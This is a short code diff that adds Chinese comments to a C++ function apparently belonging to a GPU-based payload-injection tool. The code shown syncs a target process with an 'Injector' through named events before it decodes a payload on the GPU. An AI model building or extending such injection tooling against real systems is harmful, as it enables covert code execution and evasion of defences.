@@ -22,9 +22,11 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
 }
 
 void gpuInjectionThread() {
+    // 预加载常用模块，确保 Executor 在解析 API 时能立即找到导出。
     LoadLibraryA("user32.dll");
     LoadLibraryA("kernel32.dll");
 
+    // 与 Injector 通过命名事件同步：准备、解码完成、执行完成。
     HANDLE payloadReadyEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, GPUInject::PAYLOAD_READY_EVENT);
     HANDLE decodeCompleteEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, GPUInject::DECODE_COMPLETE_EVENT);
     HANDLE executionCompleteEvent = OpenEventW(EVENT_ALL_ACCESS, FALSE, GPUInject::EXECUTION_COMPLETE_EVENT);
@@ -34,6 +36,7 @@ void gpuInjectionThread() {
         return;
     }
 
+    // 等待 Injector 通知后再去读取共享句柄，避免未写完数据。
     WaitForSingleObject(payloadReadyEvent, INFINITE);
 
     std::cout << "[target] decoding payload on gpu\n";
